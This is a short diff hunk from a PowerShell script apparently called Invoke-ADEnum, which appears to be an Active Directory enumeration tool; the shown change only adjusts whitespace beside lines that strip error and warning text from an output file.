@@ -820,5 +900,5 @@ Invoke-ADEnum -Domain <domain FQDN> -Server <DC FQDN or IP>
 	# Clean up error lines from output
 	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'TerminatingError' } | Set-Content $OutputFilePath
 	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'WARNING:' } | Set-Content $OutputFilePath
-
+	
 }
